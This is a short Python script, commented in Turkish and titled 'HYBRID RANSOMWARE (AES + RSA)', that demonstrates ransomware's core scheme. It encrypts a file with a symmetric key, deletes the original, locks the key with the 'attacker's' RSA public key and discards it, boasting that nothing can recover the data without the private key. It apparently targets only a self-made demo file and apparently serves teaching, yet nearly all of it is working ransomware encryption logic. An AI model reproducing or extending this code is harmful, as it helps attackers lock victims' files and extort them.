from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
import os

print("--- HYBRID RANSOMWARE (AES + RSA) ---")

# 1. Hazırlık: Saldırganın Anahtarları (Normalde bu sunucuda üretilir)
print("[*] Saldırgan anahtarları üretiliyor (RSA 4096-bit)...")
private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
public_key = private_key.public_key()

# Public Key'i (Kurbanın PC'sine gömülecek olan) dışarı al
pem_public = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

def encrypt_system():
    # 2. Simetrik Anahtar (AES/Fernet) Üret - Dosyaları bu şifreleyecek
    session_key = Fernet.generate_key()
    cipher_aes = Fernet(session_key)
    
    target_file = "gizli_belge.txt" # Test dosyası
    with open(target_file, "w") as f: f.write("Bu belge cok gizli sirket verileri icerir.")
    
    # 3. Dosyayı Şifrele (AES ile)
    print(f"[*] Dosya şifreleniyor: {target_file}")
    with open(target_file, "rb") as f: original_data = f.read()
    encrypted_data = cipher_aes.encrypt(original_data)
    with open(target_file + ".enc", "wb") as f: f.write(encrypted_data)
    os.remove(target_file)
    
    # 4. KRİTİK ADIM: AES Anahtarını RSA Public Key ile Kilitle
    print("[*] AES anahtarı RSA ile kilitleniyor...")
    encrypted_session_key = public_key.encrypt(
        session_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    
    # 5. Kilitli Anahtarı Kaydet ve Orijinali Yok Et (RAM'den sil)
    with open("SESSION_KEY.bin.enc", "wb") as f: f.write(encrypted_session_key)
    del session_key 
    
    print("\n✅ SİSTEM KİLİTLENDİ.")
    print("Dosyalar AES ile şifrelendi.")
    print("AES anahtarı RSA ile şifrelendi.")
    print("Private Key olmadan bu dosyaları NSA bile açamaz.")

# Kurtarma Fonksiyonu (Sadece Private Key sahibi yapabilir)
def decrypt_system():
    print("\n--- DECRYPTION (KURTARMA) ---")
    try:
        # Kilitli anahtarı oku
        with open("SESSION_KEY.bin.enc", "rb") as f: enc_key = f.read()
        
        # Private Key ile çöz
        session_key = private_key.decrypt(
            enc_key,
            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
        )
        
        # Dosyayı çöz
        cipher_aes = Fernet(session_key)
        with open("gizli_belge.txt.enc", "rb") as f: data = f.read()
        decrypted_data = cipher_aes.decrypt(data)
        
        with open("gizli_belge.txt", "wb") as f: f.write(decrypted_data)
        print("✅ Dosya başarıyla kurtarıldı.")
        
    except Exception as e:
        print(f"Kurtarma Başarısız: {e}")

if __name__ == "__main__":
    encrypt_system()
    # decrypt_system() # Test etmek istersen bunu aç